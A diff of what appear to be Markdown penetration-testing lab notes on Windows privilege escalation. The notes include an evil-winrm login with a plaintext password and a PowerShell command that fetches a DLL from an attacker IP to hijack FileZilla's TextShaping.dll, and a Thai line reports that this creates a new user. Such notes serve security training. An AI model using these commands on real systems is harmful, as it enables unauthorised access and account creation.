@@ -173,7 +173,6 @@ evil-winrm -i 192.168.222.220 -u dave2 -p 'password123!'
 
 ```
 
-
 [[PowerUp.ps1]]
 
 ```
@@ -245,3 +244,8 @@ C:\FileZilla\FileZilla FTP Client\TextShaping.dll
 ```
 iwr -uri http://192.168.45.241/dllhij.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
 ```
+
+สุดท้ายคือเปิด FileZilla ก็จะเห็น dave3 ด้วยคำสั่ง net user 
+
+[[Unquoted Service Paths]]
+
